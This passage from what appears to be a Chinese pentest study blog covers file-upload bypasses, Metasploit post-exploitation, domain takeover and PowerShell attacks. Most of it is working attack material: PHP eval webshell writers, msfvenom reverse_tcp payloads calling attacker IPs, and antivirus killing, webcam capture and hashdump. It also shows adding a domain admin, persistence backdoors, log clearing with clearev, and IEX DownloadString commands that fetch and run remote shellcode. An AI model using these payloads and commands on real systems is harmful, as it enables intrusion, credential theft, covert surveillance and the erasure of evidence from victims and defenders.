image.php</p><p>copy 1.jpg/b+lubr.php/a 1lubr.jpg</p><p>此时使用getimagesize()就获取到图片信息，且webshell的后缀是php也能被Apache解析为脚本文件</p><h4 id="服务端检测绕过-文件扩展名检测"><a href="#服务端检测绕过-文件扩展名检测" class="headerlink" title="服务端检测绕过(文件扩展名检测)"></a>服务端检测绕过(文件扩展名检测)</h4><ul><li><p>黑名单检测</p><ol><li><p>文件名大小写绕过<br> 用像 AsP，pHp 之类的文件名绕过黑名单检测</p></li><li><p>名单列表绕过<br> 用黑名单里没有的名单进行攻击，比如黑名单里没有 asa 或 cer 之类.还有php2、php3、</p></li><li><p>特殊文件名绕过<br> 比如发送的 http 包里把文件名改成 test.asp. 或 test.asp_(下划线为空格)，这种命名方式<br> 在 windows是不被允许的，所以需要在 burp 之类里进行修改，然后绕过验证后，会<br> 被 windows 系统自动去掉后面的点和空格，但要注意 Unix/Linux 系统没有这个特性。</p></li><li><p>0x00 截断绕过</p><p> 截断条件：php版本小于5.3.4 php的magic_quotes_gpc为OFF</p><p> 假如这时候获取到的文件名是 test.asp .jpg(asp 后面为 0x00) 而在 gettype()函数里处理方式是从后往前扫描扩展名，所以判断为 jpg</p><p> 实际操作：1.php%00.</p><p> jpg</p><p> 选中%00进行url编码</p><p> <img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805101116_179.png" alt=""></p><p> 或者 test.asp .jpg 去burp hex中20更改00</p></li><li><p>htaccess 文件攻击<br> 配合名单列表绕过，上传一个自定义的.htaccess，就可以轻松绕过各种检测</p><p> 该文件仅在Apache平台上存在，IIS平台上不存在该文件，该文件默认开启，启用和关闭在httpd.conf文件中配置。该文件的写法如下：</p><pre><code> &lt;FilesMatch &quot;_php.gif&quot;&gt;  SetHandler application/x-httpd-php &lt;/FilesMatch&gt;</code></pre><p> 保存为.htaccess文件。该文件的意思是，只要遇到文件名中包含有”_php.gif”字符串的，统一按照php文件来执行。该文件在Apache里默认是启用的，如果没启用，启用方法见：<a href="http://www.jb51.net/article/25476.htm" target="_blank" rel="external">http://www.jb51.net/article/25476.htm</a> 然后就可以上传一个带一句话木马的文件，例如a_php.gif，会被当成php执行。该方法其实不是漏洞，是Apache的特性。该方法常用于黑客入侵网站之后，不想被发现，留一个隐蔽的后门。在PHP手册中提到一句话，move_uploaded_file section,there is awarning which states‘If the destination file already exists, it will be overwritten.’服务器端如果采用了黑名单的形式限制上传，但是黑名单中却没有.htaccess文件，那么我们可以上传.htaccess文件覆盖掉原来的文件。</p></li><li><p>解析调用/漏洞绕过<br> 这类漏洞直接配合上传一个代码注入过的非黑名单文件即可，再利用解析调用/漏洞</p></li></ol></li><li><p>白名单检测</p></li><li><p>.htaccess 文件攻击</p></li></ul><h4 id="服务端检测绕过-文件内容检测"><a href="#服务端检测绕过-文件内容检测" class="headerlink" title="服务端检测绕过(文件内容检测)"></a>服务端检测绕过(文件内容检测)</h4><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201804071849_233.png" alt=""></p><ul><li><p>文件幻数检测</p><p>  JPG ： FF D8 FF E0 00 10 4A 46 49 46<br>  GIF ： 47 49 46 38 39 61 (GIF89a)<br>  PNG： 89 50 4E 47</p></li><li><p>文件相关信息检测</p><p>  图像文件相关信息检测常用的就是 getimagesize()函数</p></li></ul><pre><code>只需要把文件头部分伪造好就 ok GIF89a</code></pre><p>  &lt;?php phpinfo();?&gt;</p><ul><li><p>文件加载检测</p><p>  绕过方法：<br>  针对渲染加载测试：代码注入绕过<br>  针对二次渲染测试：攻击文件加载器</p></li></ul><h4 id="服务器解析漏洞"><a href="#服务器解析漏洞" class="headerlink" title="服务器解析漏洞"></a>服务器解析漏洞</h4><h5 id="Apache-解析漏洞-1"><a href="#Apache-解析漏洞-1" class="headerlink" title="Apache 解析漏洞"></a>Apache 解析漏洞</h5><ul><li>解析：Apache 解析文件的规则是从右到左开始判断解析,如果后缀名为不可识别文件解析,就再往左判断。比如 test.php.owf.rar “.owf”和”.rar” 这两种后缀是apache不可识别解析,apache就会把wooyun.php.owf.rar解析成php。</li><li>描述：若一个文件名<code>abc.x1.x2.x3</code>，<code>Apache</code>会从<code>x3</code>开始解析，如果<code>x3</code>不是一个能解析的扩展名，就往前解析<code>x2</code>以此往复，直到能遇到一个能解析的文件名为止</li></ul><h5 id="IIS-解析漏洞"><a href="#IIS-解析漏洞" class="headerlink" title="IIS 解析漏洞"></a>IIS 解析漏洞</h5><p>解析：<code>test.asp/jkl</code>,<code>IIS</code>的某些版本中会直接当成<code>asp</code>来解析;<code>test.asp;jkl</code>,<code>IIS</code>某些版本也会按照<code>asp</code>来解析；<code>任意文件名/任意文件名.php</code>，<code>IIS</code>某些版本会直接当<code>php</code>来解析</p><p>描述：</p><h5 id="IIS5-x-6-0解析漏洞"><a href="#IIS5-x-6-0解析漏洞" class="headerlink" title="IIS5.x/6.0解析漏洞"></a>IIS5.x/6.0解析漏洞</h5><p>1.<code>IIS6.0</code>在解析<code>asp</code>时有两个解析漏洞，一个是如果任意目录名包含<code>.asp</code>字符串，那么这个目录下的所有文件都会按照<code>asp</code>去解析，另一个是文件名中含有<code>asp;</code>就会优先当作<code>asp</code>来解析</p><p><strong>利用方法有两种</strong>:</p><pre><code>1. 畸形目录解析/xxxx.asp/xxx.jpg2. 分号文件解析test.asp;.jpg</code></pre><ul><li>第1种是因为xxx.jpg图片文件在某个以.asp结尾的目录下面，而被IIS当成可执行文件来解析</li><li>第2种虽然以.jpg结尾，但IIS 解析时忽略了分号”;”后面的部分，当成了test.asp文件来解析</li></ul><p>IIS7.0/7,5</p><p>在默认Fast-CGI开启状况下 </p><p>2.<code>IIS7.0/7.5</code>对php解析有类似<code>Nginx</code>的解析漏洞只要对任意文件名在url后面追加上字符串<code>/任意文件名.php</code>就会按照php去解析</p><p>上传test.jpg，然后访问test.jpg/.php或test.jpg/abc.php当前目录下就会生成一句话木马 shell.php</p><h5 id="Nginx-解析漏洞"><a href="#Nginx-解析漏洞" class="headerlink" title="Nginx 解析漏洞"></a>Nginx 解析漏洞</h5><ul><li><p>解析：</p><ol><li><p>任意文件名/任意文件名.php</p><p> 将shell语句，如</p><pre><code> &lt;?PHP fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php eval($_POST[cmd])?&gt;&#39;);?&gt;</code></pre><p> 写在文本xx.txt中(或者shell语句直接写一句话，用菜刀、cknife等直连，只是容易被查杀），然后用命令将shell语句附加在正常图片xx.jpg后</p><pre><code> copy xx.jpg/b + xx.txt/a test.jpg</code></pre><p> 上传test.jpg，然后访问test.jpg/.php或test.jpg/abc.php当前目录下就会生成一句话木马 shell.php</p></li><li><p>任意文件名%00.php都当作php来解析</p><pre><code> xx.jpg%00.php</code></pre></li></ol></li><li><p>描述：例如原文件名test.jpg但内容包含php一句话添加为test.jpg/x.php来进行解析攻击低版本可以子任意文件名后添加%00.php进行截断攻击</p></li><li><p>对应版本：</p><p>  nginx 0.5.* [Success]</p><p>  nginx 0.6.* [Success]</p><p>  nginx 0.7 &lt;= 0.7.65 [Success]</p><p>  nginx 0.8 &lt;= 0.8.37 [Success]</p></li></ul><h4 id="竞争条件攻击"><a href="#竞争条件攻击" class="headerlink" title="竞争条件攻击"></a>竞争条件攻击</h4><p>一些网站上传文件的逻辑是先允许上传任意文件，然后检查上传的文件是否含有webshell，如果包含则删除。</p><p>首先将文件上传到服务器，然后检测文件后缀名，如果不符合条件，就删掉，我们的利用思路是这样的，首先上传一个PHP文件Bigbroke.php，内容为：</p><pre><code class="php">&lt;?php fputs(fopen(&quot;./shell.php&quot;, &quot;w&quot;), &#39;&lt;?php @eval($_POST[&quot;Bigbroke&quot;]) ?&gt;&#39;); ?&gt;</code></pre><p>当然这个文件会被立马删掉，所以我们使用多线程并发的访问上传的文件，总会有一次在上传文件到删除文件这个时间段内访问到上传的PHP的文件，利用时间差完成了webshell的上传。</p><p>防御：</p><ol><li>通过白名单</li><li>对上传的文件进行重命名，例如rand(10,99)data(“Mango”).”.jpg”</li></ol><h3 id="逻辑漏洞"><a href="#逻辑漏洞" class="headerlink" title="逻辑漏洞"></a>逻辑漏洞</h3><h4 id="未授权访问"><a href="#未授权访问" class="headerlink" title="未授权访问"></a>未授权访问</h4><p>非授权访问是指用户在没有通过认证授权的情况下能够直接访问需要通过认证才能访问到的页面或文本信息。尝试将一些敏感的页面链接复制于其他浏览器或其他电脑上进行访问，看是否能访问成功。</p><h4 id="越权访问"><a href="#越权访问" class="headerlink" title="越权访问"></a>越权访问</h4><h5 id="垂直越权"><a href="#垂直越权" class="headerlink" title="垂直越权"></a>垂直越权</h5><p>垂直越权（垂直越权是指使用权限低的用户可以访问权限较高的用户）。</p><h5 id="水平越权"><a href="#水平越权" class="headerlink" title="水平越权"></a>水平越权</h5><p>水平越权（水平越权是指相同权限的不同用户可以互相访问）。</p><p>id=1是一个用户信息 改为id=2可以看到另一个用户信息</p><h2 id="第5章-Metasploit技术"><a href="#第5章-Metasploit技术" class="headerlink" title="第5章 Metasploit技术"></a><strong>第5章 Metasploit技术</strong></h2><p>Metasploit是近年来最强大﹑最流行和最有发展前途的开源渗透测试平台软件之一。它完全颠覆了已有的渗透测试方式。本章详细介绍了Metasploit的攻击步骤﹑信息收集﹑漏洞分析﹑漏洞利用﹑权限提升﹑移植漏洞代码模块，以及如何建立后门的实践方法。并通过具体的内网域渗透测试实例，来分析如何通过一个普通的WebShell权限一步一步获取域管权限，最终畅游整个内网。</p><h3 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h3><p>模块是通过Metasploit框架装载集成对外提供的最核心的渗透测试功能实现代码。<br>分为</p><p>Aux（辅助模块）</p><p>Exploit（攻击模块）</p><p>Payloads（攻击载荷模块）</p><p>POST（后期渗透模块）</p><p>Encoders（编码器模块）</p><h3 id="常见命令"><a href="#常见命令" class="headerlink" title="常见命令"></a>常见命令</h3><ul><li>启动metasploit（命令行模式） ：<code>msfconsole</code></li><li>升级metasploit：<code>msfupdate</code></li><li>查看命令使用帮助信息：<code>help [COMMAND]</code></li><li>搜索模块：<code>search</code> [模块名 //(search ms08-067)</li><li>选择模块：<code>use xxx/xxx/xxx</code></li><li>查看模块信息:<code>info</code></li><li>查看攻击载荷：<code>show payloads</code></li><li>设置攻击载荷：<code>set payload xxx/xxx/xxx</code></li><li>查看需要设置的配置参数：<code>show options</code></li><li>设置配置参数：<code>set XXXX xxxxxx</code></li><li>开始攻击：<code>exploit</code></li><li>退出当前模块:<code>back</code></li><li>退出msf : <code>exit</code></li></ul><h3 id="主机扫描"><a href="#主机扫描" class="headerlink" title="主机扫描"></a>主机扫描</h3><p>search portscan</p><p>nmap -O -Pn/p0 192.168.11.251 不使用ping 可以穿透防火墙，皮面被防火墙发现</p><h3 id="0x00-进程迁移"><a href="#0x00-进程迁移" class="headerlink" title="0x00 进程迁移"></a>0x00 进程迁移</h3><p>刚获得meterpreter shell时，改shell极其脆弱</p><p>下一步要移动shell使他和目标机中一个稳定的进程绑定在一起，而不需要对磁盘进行任何写入操作，这样渗透更难被检测到</p><ol><li><p>meterpreter &gt; ps</p><p> pid   PPID   Name            </p><p> 448  3028  explore.exe</p><p> 984     448     138.exe  </p></li><li><p>meterpreter &gt; geipid 获得meterpreter shell的进程号pid984</p></li><li><p>meterpreter &gt; migrate 448  这样把shell移动到Explore.exe进程里。</p></li><li><p>meterpreter &gt; getpid</p><p> current pid：448</p></li><li><p>进程迁移完成后 原先pid为984会自动关闭 ，如果没有则可输入 kill 984 杀掉</p></li></ol><h3 id="0x01-系统命令"><a href="#0x01-系统命令" class="headerlink" title="0x01 系统命令"></a>0x01 系统命令</h3><p>sysinfo</p><p>run post/windows/gather/checkvm   检查目标机是否允许在虚拟机上</p><p>route 查看完整网络配置</p><p>run post/windows/manage/killav 命令关闭目标机杀毒软件</p><p>run post/windows/manage/enable_rdp 开启目标机远程桌面协议</p><p>run post/windows/manage/autoroute 查看网络结构</p><p>background隐藏meterpreter</p><p>然后输入 route add 命令添加路由，添加成功后输入route print命令查看，</p><p>可以看到192.168.172.0路由已经</p><p>run post/windows/gather/enum_logged_on_users 命令列举当前有多少用户登录了目标机</p><p>run post/windows/gather/enum_applications 列举安装在目标机上的应用程序</p><p>run post/windows/gather/credentials/windows_autologin 抓取字典登录的用户名和密码</p><p>meterpreter &gt;screengrab  抓取目标机的屏幕</p><h4 id="网络摄像头摄像头命令"><a href="#网络摄像头摄像头命令" class="headerlink" title="网络摄像头摄像头命令"></a>网络摄像头摄像头命令</h4><pre><code>webcam_list  #查看摄像头webcam_snap   #通过摄像头拍照webcam_stream   #通过摄像头开启视频</code></pre><p>输入shell 进入目标机shell</p><p>exit 停止meterpreter会话</p><h4 id="文件系统命令"><a href="#文件系统命令" class="headerlink" title="文件系统命令"></a>文件系统命令</h4><p>search -f *.txt -d c:\  搜索c盘中所有以.txt为扩展名</p><p>download c:\test.txt/root   下载c盘中的test.txt文件到攻击机root下</p><pre><code>upload /tmp/hack.txt C:\ 上传文件到目标机上</code></pre><h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>meterpreter &gt; shell</p><p>whoami/groups</p><p>getuid 查看已经获得的权限</p><h5 id="1）getsystem提权"><a href="#1）getsystem提权" class="headerlink" title="1）getsystem提权"></a>1）getsystem提权</h5><pre><code>getsystem</code></pre><p>getsystem工作原理：<br>①getsystem创建一个新的Windows服务，设置为SYSTEM运行，当它启动时连接到一个命名<br>管道.②getsystem产生一个进程，它创建一个命名管道并等待来自该服务的连接<br>.③Windows服务已启动，导致与命名管道建立连接<br>.④该进程接收连接并调用ImpersonateNamedPipeClient，从而为SYSTEM用户创建模拟令牌。<br>然后用新收集的SYSTEM模拟令牌产生cmd.exe，并且我们有一个SYSTEM特权进程。</p><p>失败使用</p><p>sysinfo查看已打补丁</p><p>search 其他未打补丁的漏洞</p><h6 id="令牌窃取"><a href="#令牌窃取" class="headerlink" title="令牌窃取"></a>令牌窃取</h6><p>Token </p><p>kerberos是一种网络认证协议，通过密钥系统为客户端/服务器应用程序提供强大的认证服务：保护服务器防止错误的用户使用，同时保护它的用户使用正确的服务器，即支持双向验证。</p><p>假冒令牌实战</p><ol><li>meterpreter &gt; getuid 查看已获得权限</li><li>meterpreter &gt; getsystem 失败</li><li>meterpreter &gt; use incognito </li><li>list_tokens -u 列出可用的 token，</li><li>impersonate_token ‘NT AUTHORITY\SYSTEM’  #假冒SYSTEM token<br> 或者impersonate_token NT\ AUTHORITY\SYSTEM #不加单引号 需使用\</li></ol><h6 id="获取哈希"><a href="#获取哈希" class="headerlink" title="获取哈希"></a>获取哈希</h6><p>一、hashdump</p><p>run post/windows/gather/smart_hashdump  #从SAM导出密码哈希 需要SYSTEM权限</p><p>二、使用Quarks PwDump  </p><p>三、使用windows credentials editor </p><p>upload /root/wce.exe c:\</p><p>shell</p><p>四、使用mimikatz</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201808312334_767.jpg" alt=""></p><h5 id="2）bypassuac"><a href="#2）bypassuac" class="headerlink" title="2）bypassuac"></a>2）bypassuac</h5><p>内置多个pypassuac脚本，原理有所不同，使用方法类似，运行后返回一个新的会话，需要再次执行getsystem获取系统权限，如：</p><pre><code>use exploit/windows/local/bypassuacuse exploit/windows/local/bypassuac_injectionuse windows/local/bypassuac_vbsuse windows/local/ask</code></pre><p>如使用bypassuac.rb脚本：</p><pre><code>msf &gt; use exploit/windows/local/bypassuacmsf &gt; set SESSION 2msf &gt; run</code></pre><p>移植利用github 其他poc</p><ol><li><p>git clone</p></li><li><p>复制 *.rb到/usr/share/metasploit-framework/modules/exploits/windows/smb下，</p></li><li><p>ls查看是否加载完成</p></li><li><p>reload_all</p></li><li><p>search *</p></li><li><p>use  </p></li><li><p>攻击之前先生成一个dll 文件，如果目标机是32就生成32位dll</p></li><li><p>免杀使用powershell下的empire生成dll，</p></li><li><p>64位使用：msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.31.147 lport=3333 -f dll -o ~/eternal11.dll</p><p> 32位使用:   msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.31.147 lport=3333 -f dll -o ~/eternal11.dll</p></li><li><p>exploit</p></li></ol><h3 id="0x03-后门"><a href="#0x03-后门" class="headerlink" title="0x03 后门"></a>0x03 后门</h3><h4 id="后门工具Cymothoa"><a href="#后门工具Cymothoa" class="headerlink" title="后门工具Cymothoa"></a>后门工具Cymothoa</h4><p>Cymothoa是一款隐秘的后门工具。它通过向目标主机活跃的进程注入恶意代码，从而获取和原进程相同的权限。该工具最大的优点就是不创建新的进程，不容易被发现。由于该工具基于ptrace库，所以适合各种类Unix系统。该工具提供14种攻击载荷，可以实现各种攻击和后门。由于该后门是基于进程注入，所以当原有进程结束，后门也会被关闭。所以，渗透测试必须结合自启动脚本，注入到自启动服务中（如Web服务），才能使Cymothoa的脚本持久有效。</p><p>但是如果进程关闭或者重启，后门就停止运行。</p><ol><li>ps -aux 查看程序的pid （windows使用 tasklist）</li><li>Cymothoa -p（目标进程pid） 982 -s(shellcode编号) 1-y 3333(指定payload服务端口)</li><li>nc -nvv 192.168.31.47 4444</li></ol><h4 id="persistence"><a href="#persistence" class="headerlink" title="persistence"></a>persistence</h4><pre><code class="shell"> run persistence -h run persistence -A -S -U -i 60 -p 4231 -r 192.168.172.138</code></pre><p>选项：</p><pre><code>-P：设置Payload，默认为windows/meterpreter/reverse_tcp。该默认的payload生成的后门为32位程序。因此，当目标机器为64位系统时，留下的后门将无法运行；-U：设置后门在用户登录后自启动。该方式会在HKCU\Software\Microsoft\Windows\CurrentVersion\Run下添加注册表信息。推荐使用该参数；-X：设置后门在系统启动后自启动。该方式会在HKLM\Software\Microsoft\Windows\CurrentVersion\Run下添加注册表信息。由于权限问题，会导致添加失败，后门将无法启动。因此，在非管理员权限或者未进行BypassUAC操作情况下，不推荐使用该参数；-i：设置反向连接间隔时间，单位为秒。当设置该参数后，目标机器会每隔设置的时间回连一次所设置的ip；-p：设置反向连接的端口号。即黑阔用来等待连接的端口；-r：设置反向连接的ip地址。即黑阔用来等待连接的ip；</code></pre><p>web后门</p><p>meterpreter后门</p><ol><li><p>msfvenom创建一个webshell     ：msfvenom -p php/meterpreter/reverse_tcp LHOST 192.168.31.247 -f raw &gt; shuteer.php </p></li><li><pre><code> msf &gt; use exploit/multi/handler msf exploit(handler) &gt; set payload windows /meterpreter/reverse_tcp payload =&gt; windows /meterpreter/reverse_tcp msf exploit(handler) &gt; set LHOST 192.168.17.131 LHOST =&gt; 192.168.17.131 msf exploit(handler) &gt; set LPORT 6666 LPORT =&gt; 6666 msf exploit(handler) &gt; exploit</code></pre></li><li><p>打开<a href="http://127.0.0.1/shuteer.php" target="_blank" rel="external">http://127.0.0.1/shuteer.php</a></p></li><li><p>反弹成功</p></li></ol><p>aspx meterpreter后门</p><ol><li><p>```<br>show payloads</p></li></ol><p>use windows/shell_reverse_tcp</p><p>info</p><p>set lhost</p><p>set lport</p><p>save</p><pre><code>1. generate -h2. generate -t  aspx3. 上传到目标机c盘4.</code></pre><pre><code>msf &gt; use exploit/multi/handlermsf exploit(handler) &gt; set payload windows /meterpreter/reverse_tcppayload =&gt; windows /meterpreter/reverse_tcpmsf exploit(handler) &gt; set LHOST 192.168.17.131LHOST =&gt; 192.168.17.131msf exploit(handler) &gt; set LPORT 6666LPORT =&gt; 6666msf exploit(handler) &gt; run```</code></pre><h3 id="0x04-内网域渗透"><a href="#0x04-内网域渗透" class="headerlink" title="0x04 内网域渗透"></a>0x04 内网域渗透</h3><h4 id="提升权限"><a href="#提升权限" class="headerlink" title="提升权限"></a>提升权限</h4><p>提权 ms17010 ms15078</p><p>使用bypassuac提权（系统当前用户必须在管理员组，用户账号控制uac设置为默认） </p><pre><code>use exploit/windows/local/bypassuacset session 1run</code></pre><h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><pre><code>ipconfig /all                                          查询本机IP段，所在域等  net user                                               本机用户列表    net view                                               查询同一域内机器列表    net view /domain                                       查询域列表    net view /domain:domainname                            查看workgroup域中计算机列表net group /domain                                      查询域里面的工作组   net group &quot;domain computers&quot; /domain                      查询域内所有的主机名net group &quot;domain admins&quot; /domain                      查询域管理员用户组    net group &quot;domain controllers&quot; /domain                 查看域控制器(如果有多台) net group &quot;enterprise admins&quot; /domain                      查询企业管理组net localgroup administrators                          本机管理员[通常含有域用户]    net localgroup administrators /domain                  登录本机的域管理员    net localgroup administrators workgroup\user001 /add   域用户添加到本机   net user /domain                                       查询域用户    net time /domain                                       判断主域，主域服务器都做时间服务器 net config workstation                                 当前登录域net session                                            查看当前会话 net use \\ip\ipc$ pawword /user:username               建立IPC会话[空连接­***] net share                                              查看SMB指向的路径[即共享net start                                              查看当前运行的服务 net accounts                                           查看本地密码策略 net accounts /domain                                   查看域密码策略nbtstat –A ip                                          netbios 查询  netstat –an/ano/anb                                    网络连接查询  route print                                            路由表</code></pre><h4 id="ipc-入侵实战"><a href="#ipc-入侵实战" class="headerlink" title="ipc$入侵实战"></a>ipc$入侵实战</h4><p>net use \127.0.0.21\ipc$    连接ipc共享</p><p>copy 1.exe \127.0.0.21\ipc$   复制1.exe到目标主机</p><p>net time  \127.0.0.21 查看服务器上的时间</p><p>at \127.0.0.21 10:50 1.exe <code>at</code>命令来设置定时任务</p><p>反弹meterpreter shell</p><p>handler监听</p><p>sysinfo 查看服务器信息和权限</p><p>getuid  查看权限</p><p>使用mimikatz或者hashdump抓hash</p><p>net use \127.0.0.21 \ipc$ /del 渗透完毕后删掉记录</p><h4 id="powershell寻找域管在线服务器"><a href="#powershell寻找域管在线服务器" class="headerlink" title="powershell寻找域管在线服务器"></a>powershell寻找域管在线服务器</h4><pre><code class="shell">powershell.exe -exec bypass -Command &quot;&amp;{Import-Module .\powerview.ps1;Invoke-UserHunter}&quot;`</code></pre><p>获取当域管理员在线登录的服务器，ip</p><p>主机名为pav… ip为…</p><h4 id="获取域管权限"><a href="#获取域管权限" class="headerlink" title="获取域管权限"></a>获取域管权限</h4><p>getsystem  提权</p><p>ps 找到与管理所在的进程</p><p>migrate 进程pid    把meterpreter shell进程迁移此进程</p><p>getuid</p><p>net time 查看主域控ip（一般来说时间服务器都是域服务器）</p><p>得到域服务器的主机名为PAV Ip为10.51.0.11</p><p>使用ipc$ 反弹meterpreter shell</p><p>net user Bigbroke pass /ad /domain 添加用户</p><p>net group “domain admins” /domain 给域控添加管理员</p><h4 id="登录域控制"><a href="#登录域控制" class="headerlink" title="登录域控制"></a>登录域控制</h4><p>具体可以看书</p><p>将最好的方式：使用metasploit下的PsExec反弹meterpreter，</p><p>注意两点</p><ul><li>MSF中的PsExec模块</li><li>cuestom模块，建议使用类似Veil生成免杀payload</li></ul><pre><code class="shell">msf auxiliary(scanner/portscan/tcp) &gt; use exploit/multi/handlermsf exploit(multi/handler) &gt; use exploit/windows/smb/psexecmsf exploit(windows/smb/psexec) &gt; show options Module options (exploit/windows/smb/psexec):   Name                  Current Setting  Required  Description   ----                  ---------------  --------  -----------   RHOST                                  yes       The target address   RPORT                 445              yes       The SMB service port (TCP)   SERVICE_DESCRIPTION                    no        Service description to to be used on target for pretty listing   SERVICE_DISPLAY_NAME                   no        The service display name   SERVICE_NAME                           no        The service name   SHARE                 ADMIN$           yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share   SMBDomain             .                no        The Windows domain to use for authentication   SMBPass                                no        The password for the specified username   SMBUser                                no        The username to authenticate asExploit target:   Id  Name   --  ----   0   Automaticmsf exploit(windows/smb/psexec) &gt; set smbuser Bigbrokesmbuser =&gt; Bigbrokemsf exploit(windows/smb/psexec) &gt; set smbpass passmsf exploit(windows/smb/psexec) &gt; set rhost 10.51.0.11rhost =&gt; 10.51.0.11msf exploit(windows/smb/psexec) &gt; runmeterpreter &gt; migrate 2416meterpreter &gt; getuidmeterpreter &gt; getpidmeterpreter &gt; sysinfo</code></pre><p>抓hash（system权限）</p><h4 id="smb爆破内网"><a href="#smb爆破内网" class="headerlink" title="smb爆破内网"></a>smb爆破内网</h4><p>有域控密码 ，接下来内网扩大控制权限</p><ul><li>利用当前获取的域控账号密码，对整个域控ip段扫描</li><li>利用smb下的sm_login模块</li><li>端口转发或者socks代理进内网</li></ul><pre><code>meterpreter &gt; backgroundmsf exploit(multi/handler) &gt; route add 10.51.0.11 255.255.0.0msf exploit(multi/handler) &gt; search smb_loginmsf exploit(multi/handler) &gt; use auxiliary/scanner/smb/smb_login msf auxiliary(scanner/smb/smb_login) &gt; set rhostsmsf auxiliary(scanner/smb/smb_login) &gt; set smbuser msf auxiliary(scanner/smb/smb_login) &gt; set smbpassmsf auxiliary(scanner/smb/smb_login) &gt; set smbdomain msf auxiliary(scanner/smb/smb_login) &gt; set threads 16msf auxiliary(scanner/smb/smb_login) &gt; set creds</code></pre><p>可以使用meterpreter的端口转发，也可以使用metasploit下的 socks4a模块</p><p>meterpreter &gt; portfwd add -l 5555 -p 3389 -r 127.0.0.1</p><h3 id="0x05-清理日志"><a href="#0x05-清理日志" class="headerlink" title="0x05 清理日志"></a>0x05 清理日志</h3><ul><li>删除之前的域管理账号</li><li>删除所有在渗透过程中使用过的工具</li><li>删除应用程序、系统和安全日志</li><li>关闭所有meterpreter</li></ul><p>删除账号</p><pre><code>net user Bigbroke /dellogoff</code></pre><p>删除日志</p><p>meterpreter &gt; clearev</p><p>关闭所有msf连接</p><p>msf exploit(psexec) &gt; sessions</p><p>msf exploit(psexec) &gt;  sessions -K</p><h3 id="-1"><a href="#-1" class="headerlink" title=" "></a> </h3><h2 id="第6章-PowerShell攻击指南"><a href="#第6章-PowerShell攻击指南" class="headerlink" title="第6章 PowerShell攻击指南"></a><strong>第6章 PowerShell攻击指南</strong></h2><p>学习推荐windows powershell 实战指南和三叶草师傅的gitbook<a href="https://legacy.gitbook.com/book/rootclay/powershell-attack-guide/details" target="_blank" rel="external">https://legacy.gitbook.com/book/rootclay/powershell-attack-guide/details</a></p><p>在渗透测试中，PowerShell是不能忽略的一个环节，而且仍在不断地更新和发展，它具有令人难以置信的灵活性和功能化管理Windows系统的能力。PowerShell的众多特点使得它在获得和保持对系统的访问权限时，也成为攻击者首选的攻击手段。本章详细介绍了PowerShell的基本概念和常用命令，以及PowerSploit﹑Empire﹑Nishang等常用PowerShell攻击工具的安装及具体模块的使用，包括生成木马、信息探测、权限提升、横向渗透、凭证窃取、键盘记录、后门持久化等操作。</p><p>常用工具</p><ul><li>powerSplit</li><li>Nishang</li><li>Empire</li><li>PowerCat</li></ul><h3 id="Powershell基础"><a href="#Powershell基础" class="headerlink" title="Powershell基础"></a>Powershell基础</h3><p>powershell的后缀是ps1，哪为什么是ps1而不是ps2,ps3呢？那么理解这个问题呢我们可以看看powershell的特性，powershell是对下完全兼容的，也就是说你使用powershell 5.x的版本来执行powershell v1.0的代码也是完全没有问题的。</p><h4 id="执行策略"><a href="#执行策略" class="headerlink" title="执行策略"></a>执行策略</h4><p> PowerShell 提供了 Restricted、AllSigned、RemoteSigned、Unrestricted、Bypass、Undefined 六种类型的执行策略</p><p>如何绕过这些安全策略，下面提供几种方法，网上还有很多的绕过方法，：</p><table><thead><tr><th>名称</th><th>说明</th><th></th></tr></thead><tbody><tr><td>Get-ExecutionPolicy</td><td>获取当前的执行策略</td><td></td></tr><tr><td>Get-Content .\test.ps1 \</td><td>powershell.exe -noprofile -</td><td>通过管道输入进ps</td></tr><tr><td>powershell -nop -c “iex(New-Object Net.WebClient).DownloadString(‘<a href="http://192.168.1.2/test.ps1" target="_blank" rel="external">http://192.168.1.2/test.ps1</a>‘)”</td><td>通过远程下载脚本来绕过</td><td></td></tr><tr><td><code>$command = &quot;Write-Host &#39;Hello World!&#39;&quot; $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)  $encodedCommand = [Convert]::ToBase64String($bytes)  powershell.exe -EncodedCommand $encodedCommand</code></td><td>通过BASE64编码执行</td></tr></tbody></table><h4 id="运行脚本"><a href="#运行脚本" class="headerlink" title="运行脚本"></a>运行脚本</h4><p>1.直接执行脚本.\shell.ps1</p><p>2.C:\Scripts\shell.ps1</p><h4 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h4><p>powershell -ExecutionPolicy Bypass -File .\xxx.ps1 绕过本地权限执行</p><p>powershell -EncodedCommand dwBoAG8AYQBtAGkACgA=</p><p>Powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoLogo -NonInteractive -NoProfile -File .\xxx.ps1 本地隐藏绕过权限执行脚本</p><h3 id="Powersploit"><a href="#Powersploit" class="headerlink" title="Powersploit"></a>Powersploit</h3><p>AntivirusBypass:发现杀毒软件的查杀特征</p><p>CodeExecution:在目标机上执行代码</p><p>Exfiltration:目标主机上的信息搜集工具</p><p>Mayhem:蓝屏等破坏性脚本</p><p>Persistence:后门脚本</p><p>Recon:以目标主机为跳板进行内网信息侦查</p><p>ScriptModification：目标主机上创建或修改脚本</p><h4 id="一-执行shellcode反弹meterpreter-shell"><a href="#一-执行shellcode反弹meterpreter-shell" class="headerlink" title="一.执行shellcode反弹meterpreter shell"></a>一.执行shellcode反弹meterpreter shell</h4><p>1.使用msfvenom生成一个powershell脚本。</p><p> <code>msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.125 LPORT=4444 -f powershell -o /var/www/html/test</code></p><p>2.目标机powershell输入以下命令</p><pre><code>IEX(New-ObjectNet.WebClient).DownloadString(&amp;quot;http://192.168.110.129/CodeExecution/Invoke-Shellcode.ps1&amp;quot;)`IEX (New-ObjectNet.WebClient).DownloadString(&amp;quot;http://192.168.110.129/test&amp;quot;)Invoke-Shellcode 